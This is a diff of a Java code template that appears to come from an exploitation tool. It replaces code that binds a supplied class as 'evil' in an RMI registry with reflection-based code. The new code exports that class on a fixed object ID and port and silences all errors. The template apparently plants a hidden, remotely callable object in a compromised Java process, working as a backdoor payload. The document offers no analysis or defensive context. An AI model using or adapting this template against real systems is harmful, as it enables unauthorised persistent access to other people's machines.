@@ -1,16 +1,32 @@
 {
-    if(FLAG==true)
-        return;
-    FLAG=true;
     try {
-        java.rmi.registry.LocateRegistry.createRegistry({{{port}}});
-    } catch (Exception e) {
-        System.out.println("be used");
-    }
-    try {
-        java.rmi.registry.Registry registry = java.rmi.registry.LocateRegistry.getRegistry({{{port}}});
-        registry.bind("evil", (java.rmi.Remote) Class.forName("{{{className}}}").newInstance());
-    } catch (Exception e) {
-        e.printStackTrace();
-    }
+        Long id2 = Long.valueOf(123456789L);
+        java.rmi.server.UID uid = new java.rmi.server.UID((short) 12345);
+        java.lang.reflect.Constructor objIDConstructor = java.rmi.server.ObjID.class.getDeclaredConstructor(new java.lang.Class[]{
+                long.class,
+                java.rmi.server.UID.class
+        });
+        objIDConstructor.setAccessible(true);
+        java.rmi.server.ObjID objID = (java.rmi.server.ObjID) objIDConstructor.newInstance(new java.lang.Object[]{
+                id2,
+                uid
+        });
+
+        sun.rmi.transport.tcp.TCPEndpoint localEndpoint = sun.rmi.transport.tcp.TCPEndpoint.getLocalEndpoint({{{rmiExObjPort}}});
+        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objID, localEndpoint, false);
+
+        sun.rmi.server.UnicastServerRef unicastServerRef = new sun.rmi.server.UnicastServerRef(liveRef);
+
+
+        java.lang.reflect.Method exportObjectMethod = java.rmi.server.UnicastRemoteObject.class.getDeclaredMethod("exportObject", new java.lang.Class[]{
+                java.rmi.Remote.class,
+                sun.rmi.server.UnicastServerRef.class
+        });
+        exportObjectMethod.setAccessible(true);
+        java.rmi.Remote remote = (java.rmi.Remote) exportObjectMethod.invoke(null, new Object[]{
+                Class.forName("{{{className}}}").newInstance(),
+                unicastServerRef
+        });
+    } catch (Exception e) {}
+    return;
 }
